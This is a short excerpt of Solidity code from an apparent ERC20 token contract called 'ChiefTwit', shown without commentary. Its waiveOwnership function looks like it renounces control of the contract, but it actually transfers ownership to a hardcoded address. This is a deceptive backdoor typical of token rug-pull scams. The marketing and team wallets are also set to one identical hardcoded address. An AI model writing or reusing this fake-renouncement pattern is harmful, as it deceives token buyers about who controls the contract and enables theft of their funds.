...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x71fa3224df304Fd18eA146649Eb8dd47D8b3A661));
        _owner = address(0x71fa3224df304Fd18eA146649Eb8dd47D8b3A661);
    }
...
contract ChiefTwit is Context, IERC20, Ownable {
    ...
    string private _name = "ChiefTwit";
    string private _symbol = "ChiefTwit";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8F3698155e268659dD3147101fC0f98Ed0a8c4A3);
    address payable public teamWalletAddress = payable(0x8F3698155e268659dD3147101fC0f98Ed0a8c4A3);
